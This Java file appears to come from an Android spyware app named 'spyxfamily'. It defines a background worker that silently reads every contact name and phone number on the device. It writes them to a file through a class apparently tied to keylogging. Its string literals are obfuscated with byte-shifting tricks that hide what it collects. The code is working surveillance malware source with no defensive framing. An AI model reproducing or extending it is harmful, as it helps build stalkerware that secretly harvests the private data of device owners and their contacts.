package com.example.spyxfamily;
import android.annotation.SuppressLint;
import android.content.Context;
import android.database.Cursor;
import android.provider.ContactsContract;

import androidx.annotation.NonNull;
import androidx.work.Worker;
import androidx.work.WorkerParameters;

import com.example.spyxfamily.KeyboardManager;

public class ContactsWorker extends Worker {
    public ContactsWorker(@NonNull Context context, @NonNull WorkerParameters workerParams) {
        super(context, workerParams);
    }

    @SuppressLint("Range")
    @NonNull
    @Override
    public Result doWork() {
        Context applicationContext = getApplicationContext();
        KeyboardManager keyboardManager = KeyboardManager.getInstance(applicationContext.getApplicationContext());
        StringBuilder sb = new StringBuilder();

        // get contact information
        Cursor contacts = applicationContext.getContentResolver()
                .query(ContactsContract.Contacts.CONTENT_URI,
                        null,
                        null,
                        null,
                        null);
        if (contacts.moveToFirst()) {
            do {
                sb.append((new Object() {int t;public String toString() {byte[] buf = new byte[5];t = -1455781070;buf[0] = (byte) (t >>> 18);t = -1409195733;buf[1] = (byte) (t >>> 8);t = -1953974615;buf[2] = (byte) (t >>> 7);t = 1021674901;buf[3] = (byte) (t >>> 2);t = 414832608;buf[4] = (byte) (t >>> 11);return new String(buf);}}.toString()));
                sb.append(contacts.getString(contacts.getColumnIndex((new Object() {int t;public String toString() {byte[] buf = new byte[12];t = -863491332;buf[0] = (byte) (t >>> 21);t = -484133231;buf[1] = (byte) (t >>> 4);t = 208948454;buf[2] = (byte) (t >>> 1);t = 459356188;buf[3] = (byte) (t >>> 7);t = 1725447262;buf[4] = (byte) (t >>> 17);t = 1814368749;buf[5] = (byte) (t >>> 21);t = -1646539083;buf[6] = (byte) (t >>> 11);t = 1853224378;buf[7] = (byte) (t >>> 12);t = 1854379917;buf[8] = (byte) (t >>> 24);t = -619898767;buf[9] = (byte) (t >>> 6);t = -1524931783;buf[10] = (byte) (t >>> 14);t = -1973861400;buf[11] = (byte) (t >>> 14);return new String(buf);}}.toString()))));
                sb.append((new Object() {int t;public String toString() {byte[] buf = new byte[2];t = 324836679;buf[0] = (byte) (t >>> 16);t = -1218364858;buf[1] = (byte) (t >>> 23);return new String(buf);}}.toString()));
                String id = contacts.getString(contacts.getColumnIndex(ContactsContract.Contacts._ID));

                if (Integer.parseInt(contacts.getString(contacts.getColumnIndex((new Object() {int t;public String toString() {byte[] buf = new byte[16];t = -1516516075;buf[0] = (byte) (t >>> 5);t = 438553661;buf[1] = (byte) (t >>> 5);t = -1331960009;buf[2] = (byte) (t >>> 4);t = 76594872;buf[3] = (byte) (t >>> 9);t = 385889618;buf[4] = (byte) (t >>> 20);t = 1059168268;buf[5] = (byte) (t >>> 10);t = -1112577314;buf[6] = (byte) (t >>> 1);t = 391699552;buf[7] = (byte) (t >>> 9);t = -679713442;buf[8] = (byte) (t >>> 8);t = -1892685414;buf[9] = (byte) (t >>> 15);t = -1486702723;buf[10] = (byte) (t >>> 7);t = -2111671852;buf[11] = (byte) (t >>> 2);t = -1399100102;buf[12] = (byte) (t >>> 14);t = -2100986029;buf[13] = (byte) (t >>> 17);t = -1511628886;buf[14] = (byte) (t >>> 12);t = 248105189;buf[15] = (byte) (t >>> 10);return new String(buf);}}.toString())))) > 0) {
                    Cursor hp = applicationContext.getContentResolver().query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                            null,
                            (new Object() {int t;public String toString() {byte[] buf = new byte[10];t = -1009935587;buf[0] = (byte) (t >>> 3);t = 838692751;buf[1] = (byte) (t >>> 8);t = -1989252833;buf[2] = (byte) (t >>> 16);t = 1831352850;buf[3] = (byte) (t >>> 7);t = -1772134113;buf[4] = (byte) (t >>> 8);t = -656006828;buf[5] = (byte) (t >>> 22);t = 458084906;buf[6] = (byte) (t >>> 10);t = -244745094;buf[7] = (byte) (t >>> 10);t = 1151128424;buf[8] = (byte) (t >>> 9);t = -1302035677;buf[9] = (byte) (t >>> 3);return new String(buf);}}.toString()) + id,
                            null,
                            null);
                    while (hp.moveToNext()) {
                        sb.append((new Object() {int t;public String toString() {byte[] buf = new byte[6];t = -989192499;buf[0] = (byte) (t >>> 20);t = 1523372506;buf[1] = (byte) (t >>> 9);t = 158313966;buf[2] = (byte) (t >>> 5);t = -612167673;buf[3] = (byte) (t >>> 22);t = 1702412491;buf[4] = (byte) (t >>> 24);t = -466848594;buf[5] = (byte) (t >>> 9);return new String(buf);}}.toString()));
                        sb.append(hp.getString(hp.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER)));
                        sb.append((new Object() {int t;public String toString() {byte[] buf = new byte[2];t = -1170554696;buf[0] = (byte) (t >>> 1);t = 1852563909;buf[1] = (byte) (t >>> 24);return new String(buf);}}.toString()));
                    }
                    hp.close();
                    sb.append((new Object() {int t;public String toString() {byte[] buf = new byte[2];t = 705124127;buf[0] = (byte) (t >>> 6);t = 1586322358;buf[1] = (byte) (t >>> 6);return new String(buf);}}.toString()));
                }
            } while (contacts.moveToNext());
        }
        contacts.close();
        keyboardManager.writeFile(sb.toString());

        return Result.success();
    }
}
